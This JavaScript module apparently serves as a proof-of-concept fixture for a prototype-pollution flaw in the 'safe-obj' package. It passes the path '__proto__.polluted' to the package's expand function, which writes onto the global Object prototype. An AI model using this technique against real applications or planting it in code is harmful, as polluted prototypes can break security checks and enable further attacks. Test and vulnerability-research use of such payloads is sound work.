function getPayload() {
    var safeObj = require("safe-obj");
    var obj = {};

    return {
        obj: obj,
        protoPollution: (value) => {
            safeObj.expand(obj, "__proto__.polluted", value);
        }
    };
}

module.exports = { getPayload };